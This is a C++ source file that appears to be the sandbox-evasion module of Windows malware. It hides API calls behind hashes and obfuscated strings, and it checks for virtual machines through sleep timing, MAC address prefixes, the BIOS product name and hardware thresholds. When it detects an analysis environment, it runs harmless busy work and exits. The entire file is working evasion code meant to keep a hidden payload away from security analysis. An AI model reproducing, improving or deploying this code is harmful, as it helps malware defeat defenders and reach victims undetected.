// ============================================================================
// sandbox_evasion.cpp — Multi-layer Sandbox / Virtual Machine Detection
// ============================================================================
#include "sandbox_evasion.h"
#include "obfuscation.h"
#include "api_table.h"

#ifdef _WIN32
#include <iphlpapi.h>
#include <cstring>
#include <random>

// ============================================================================
// Layer 1: Sleep acceleration timing check
// ============================================================================
bool checkTimingSandbox() {
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    typedef DWORD (WINAPI *pGetTickCount)(void);
    pGetTickCount _GetTickCount = (pGetTickCount)resolveApiByHash(hKernel, COMPILE_HASH("GetTickCount"));
    if (!_GetTickCount) return false;

    DWORD start = _GetTickCount();
    g_api.Sleep(1000);
    DWORD elapsed = _GetTickCount() - start;

    return elapsed < 800;
}

// ============================================================================
// Layer 2: MAC OUI prefix check
// ============================================================================
bool checkMacSandbox() {
    HMODULE hIphlpapi = g_api.LoadLibraryA(OBF("iphlpapi.dll"));
    if (!hIphlpapi) return false;

    typedef DWORD (WINAPI *pGetAdaptersInfo)(void*, PULONG);
    pGetAdaptersInfo _GetAdaptersInfo = (pGetAdaptersInfo)resolveApiByHash(hIphlpapi, COMPILE_HASH("GetAdaptersInfo"));
    if (!_GetAdaptersInfo) { g_api.FreeLibrary(hIphlpapi); return false; }

    ULONG bufLen = 0;
    _GetAdaptersInfo(NULL, &bufLen);
    if (bufLen == 0) { g_api.FreeLibrary(hIphlpapi); return false; }

    void* buf = g_api.HeapAlloc(g_api.GetProcessHeap(), HEAP_ZERO_MEMORY, bufLen);
    if (!buf) { g_api.FreeLibrary(hIphlpapi); return false; }

    DWORD ret = _GetAdaptersInfo(buf, &bufLen);
    bool vmFound = false;

    if (ret == NO_ERROR) {
        IP_ADAPTER_INFO* pAdapter = (IP_ADAPTER_INFO*)buf;
        while (pAdapter) {
            if (pAdapter->AddressLength >= 3) {
                DWORD oui = ((DWORD)pAdapter->Address[0] << 16)
                          | ((DWORD)pAdapter->Address[1] << 8)
                          | (DWORD)pAdapter->Address[2];
                for (int i = 0; i < (int)NUM_VM_MACS; i++) {
                    if (oui == g_vm_mac_prefixes[i]) {
                        vmFound = true;
                        break;
                    }
                }
            }
            if (vmFound) break;
            pAdapter = pAdapter->Next;
        }
    }

    g_api.HeapFree(g_api.GetProcessHeap(), 0, buf);
    g_api.FreeLibrary(hIphlpapi);
    return vmFound;
}

// ============================================================================
// Layer 3: BIOS string check via registry
// ============================================================================
bool checkBiosSandbox() {
    HMODULE hAdvapi = g_api.LoadLibraryA(OBF("advapi32.dll"));
    if (!hAdvapi) return false;

    typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LONG (WINAPI *pRegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    typedef LONG (WINAPI *pRegCloseKey)(HKEY);

    pRegOpenKeyExA _RegOpenKeyExA = (pRegOpenKeyExA)resolveApiByHash(hAdvapi, COMPILE_HASH("RegOpenKeyExA"));
    pRegQueryValueExA _RegQueryValueExA = (pRegQueryValueExA)resolveApiByHash(hAdvapi, COMPILE_HASH("RegQueryValueExA"));
    pRegCloseKey _RegCloseKey = (pRegCloseKey)resolveApiByHash(hAdvapi, COMPILE_HASH("RegCloseKey"));

    if (!_RegOpenKeyExA || !_RegQueryValueExA || !_RegCloseKey) {
        g_api.FreeLibrary(hAdvapi);
        return false;
    }

    const char* biosPath = OBF("HARDWARE\\DESCRIPTION\\System\\BIOS");
    const char* productKey = OBF("SystemProductName");

    // BUGFIX: hKey must be initialised before any use. The old code called
    // _RegCloseKey(hKey) on a garbage handle when the first open failed (UB),
    // then retried the very same open — an immediate retry of a failed
    // RegOpenKeyExA cannot succeed, so the retry was dead weight too.
    // Now: single open attempt, fail -> clean exit, never close a garbage handle.
    HKEY hKey = NULL;
    LONG status = _RegOpenKeyExA(HKEY_LOCAL_MACHINE, biosPath, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) { g_api.FreeLibrary(hAdvapi); return false; }

    char value[256] = {0};
    DWORD valSize = sizeof(value) - 1;
    DWORD valType = 0;
    status = _RegQueryValueExA(hKey, productKey, NULL, &valType, (LPBYTE)value, &valSize);
    _RegCloseKey(hKey);

    bool vmFound = false;
    if (status == ERROR_SUCCESS && valType == REG_SZ && value[0]) {
        for (int i = 0; value[i]; i++)
            if (value[i] >= 'A' && value[i] <= 'Z') value[i] += 32;

        for (int i = 0; i < (int)NUM_VM_BIOS_STRINGS; i++) {
            if (strstr(value, g_vm_bios_strings[i]) != NULL) {
                vmFound = true;
                break;
            }
        }
    }

    g_api.FreeLibrary(hAdvapi);
    return vmFound;
}

// ============================================================================
// Layer 4: Hardware threshold check
// ============================================================================
bool checkHardwareSandbox() {
    HMODULE hKernel = getModuleByHash(COMPILE_HASH("kernel32"));
    if (!hKernel) return false;

    typedef void (WINAPI *pGetSystemInfo)(LPSYSTEM_INFO);
    typedef BOOL (WINAPI *pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);

    pGetSystemInfo _GetSystemInfo = (pGetSystemInfo)resolveApiByHash(hKernel, COMPILE_HASH("GetSystemInfo"));
    pGlobalMemoryStatusEx _GlobalMemoryStatusEx = (pGlobalMemoryStatusEx)(void*)resolveApiByHash(hKernel, COMPILE_HASH("GlobalMemoryStatusEx"));

    if (!_GetSystemInfo || !_GlobalMemoryStatusEx) return false;

    SYSTEM_INFO si;
    _GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (_GlobalMemoryStatusEx(&ms)) {
        DWORD ramGB = (DWORD)(ms.ullTotalPhys / (1024ULL * 1024ULL * 1024ULL));
        if (ramGB < 2) return true;
    }

    typedef BOOL (WINAPI *pGetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    pGetDiskFreeSpaceExA _GetDiskFreeSpaceExA = (pGetDiskFreeSpaceExA)(void*)resolveApiByHash(hKernel, COMPILE_HASH("GetDiskFreeSpaceExA"));

    if (_GetDiskFreeSpaceExA) {
        ULARGE_INTEGER freeBytes, totalBytes;
        if (_GetDiskFreeSpaceExA(OBF("C:\\"), &freeBytes, &totalBytes, NULL)) {
            DWORD diskGB = (DWORD)(totalBytes.QuadPart / (1024ULL * 1024ULL * 1024ULL));
            if (diskGB < 60) return true;
        }
    }

    return false;
}

// ============================================================================
// Comprehensive detection
// ============================================================================
int detectSandboxDeep() {
    int flags = 0;
    if (checkTimingSandbox())      flags |= (1 << 0);
    if (checkMacSandbox())         flags |= (1 << 1);
    if (checkBiosSandbox())        flags |= (1 << 2);
    if (checkHardwareSandbox())    flags |= (1 << 3);
    return flags;
}

// ============================================================================
// Benign behavior when sandbox detected
// ============================================================================
void benignBehavior() {
    volatile DWORD _counter = 0;
    for (int _i = 0; _i < 3; _i++) {
        for (int _j = 0; _j < 1000; _j++) {
            _counter += (_j * _j) & 0xFF;
        }
        g_api.Sleep(50 + (_i * 10));
    }
    ExitProcess(0);
}

// ============================================================================
// Legacy wrapper
// ============================================================================
bool isSandboxDetected() {
    int result = detectSandboxDeep();
    if (result > 0) {
        benignBehavior();
        return true;
    }
    return false;
}

#endif // _WIN32
